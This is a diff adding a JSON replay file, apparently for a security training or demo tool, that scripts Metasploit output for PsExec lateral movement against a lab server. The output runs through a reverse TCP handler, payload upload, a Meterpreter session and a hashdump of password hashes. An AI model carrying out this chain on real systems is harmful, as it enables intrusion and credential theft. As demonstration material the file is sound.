@@ -1,0 +1,35 @@
+{
+  "id": "lateral_movement",
+  "title": "SMB PsExec Lateral Movement",
+  "description": "Demonstration of using PsExec against a lab server after credential reuse.",
+  "events": [
+    { "timestamp": 0, "output": "msf6 exploit(windows/smb/psexec) > run" },
+    { "timestamp": 2, "output": "[*] Started reverse TCP handler on 10.10.0.5:4444" },
+    { "timestamp": 4.5, "output": "[*] 10.10.0.45:445 - Connecting to the server..." },
+    {
+      "timestamp": 7.4,
+      "output": "[*] 10.10.0.45:445 - Authenticating to 10.10.0.45:445 as domain\\\\ops"
+    },
+    { "timestamp": 10.3, "output": "[+] 10.10.0.45:445 - Authentication successful" },
+    {
+      "timestamp": 12.8,
+      "output": "[*] 10.10.0.45:445 - Uploading payload...  (\\\\WINDOWS\\\\system32\\\\spool\\\\drivers\\\\color\\\\RZsUsv.exe)"
+    },
+    { "timestamp": 16.2, "output": "[*] 10.10.0.45:445 - Executing the payload..." },
+    { "timestamp": 19.6, "output": "[+] 10.10.0.45:445 - Service started successfully..." },
+    { "timestamp": 22.4, "output": "[*] Sending stage (175174 bytes) to 10.10.0.45" },
+    {
+      "timestamp": 25.1,
+      "output": "[*] Meterpreter session 5 opened (10.10.0.5:4444 -> 10.10.0.45:49873)"
+    },
+    { "timestamp": 28.5, "output": "meterpreter > ps" },
+    { "timestamp": 33.2, "output": "PID   PPID  Name               Arch  Session  User" },
+    { "timestamp": 36, "output": "----  ----  -----------------  ----  -------  ----------------" },
+    { "timestamp": 40.7, "output": "1234  456   lsass.exe          x64   0        NT AUTHORITY\\\\SYSTEM" },
+    { "timestamp": 44.5, "output": "meterpreter > hashdump" },
+    { "timestamp": 49, "output": "[*] Obtaining the boot key..." },
+    { "timestamp": 52.7, "output": "[*] Calculating the hboot key using SYSKEY 9a4e1..." },
+    { "timestamp": 56.3, "output": "[*] Dumping password hashes..." },
+    { "timestamp": 60, "output": "[+] 10.10.0.45:445 - Extracted 4 password hashes" }
+  ]
+}
